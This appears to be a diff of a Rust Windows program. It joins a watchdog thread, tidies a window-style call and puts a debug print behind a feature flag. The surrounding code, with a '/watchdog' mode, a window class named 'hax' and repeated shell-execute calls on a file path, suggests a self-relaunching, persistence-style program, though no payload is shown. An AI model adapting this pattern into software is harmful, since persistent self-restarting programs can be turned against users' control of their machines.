@@ -75,8 +75,8 @@ fn main() -> Result<(), WinError> {
     };
 
     if arg == "/watchdog" {
-        thread::spawn(watchdog_thread);
-        // watchdog_thread.join().unwrap().unwrap();
+        let watchdog_thread = thread::spawn(watchdog_thread);
+        watchdog_thread.join().unwrap().unwrap();
 
         let c: WNDCLASSEXA = WNDCLASSEXA {
             cbSize: size_of::<WNDCLASSEXA>() as u32,
@@ -97,7 +97,7 @@ fn main() -> Result<(), WinError> {
 
         let hwnd = unsafe {
             CreateWindowExA(
-                WINDOW_EX_STYLE(0),
+                WINDOW_EX_STYLE::default(),
                 s!("hax"),
                 PCSTR::null(),
                 WINDOW_STYLE::default(),
@@ -154,6 +154,7 @@ fn main() -> Result<(), WinError> {
 
         let path = String::from_utf16(&fn_buf).expect("Cannot convert fn_buf");
         let file_path = path.replace('\0', "");
+        #[cfg(feature = "DEBUG_MODE")]
         dbg!(&file_path);
         for _ in 0..5 {
             wrap_shell_execute_w(
